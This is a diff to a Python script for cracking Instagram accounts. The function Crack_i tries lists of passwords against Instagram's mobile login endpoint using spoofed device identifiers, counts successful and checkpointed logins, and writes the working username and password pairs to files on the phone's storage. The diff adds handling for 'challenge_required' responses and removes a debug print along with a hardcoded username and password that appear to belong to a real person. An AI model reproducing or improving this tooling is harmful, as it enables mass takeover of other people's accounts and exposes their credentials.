@@ -850,13 +850,11 @@ def Crack_api(username, kontol):
 
 def Crack_i(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\r{GREEN}M2{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}- {GREEN}{str(username)[:6]}{WHITE} -Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
             uag = UA_OLD()
-            username = 'pandeykarishma079'
-            password = '626743'
             base_ts = int(time.time())
             device_id = str(uuid.uuid4())
             family_device_id = str(uuid.uuid4())
@@ -910,7 +908,6 @@ def Crack_i(username, memek):
             signed_body = f"SIGNATURE.{json_str}"
             data = {"signed_body":signed_body}
             response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=True)
-            print(response.text)
             if "logged_in_user" in str(response.text.replace('\\', '')):
                 Ok += 1
                 header_str = str(response.headers)
@@ -943,6 +940,11 @@ def Crack_i(username, memek):
                 Cp += 1
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                 open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
+                break
+            elif 'challenge_required' in str(response.text.replace('\\', '')):
+                Cp += 1
+                print(f"\r\033[1;93m [⚠ challenge] {username} | {password}")
+                open("/sdcard/SUMON_INS_Cl.txt","a").write(username+"|"+password+"\n")
                 break
             else:
                 continue
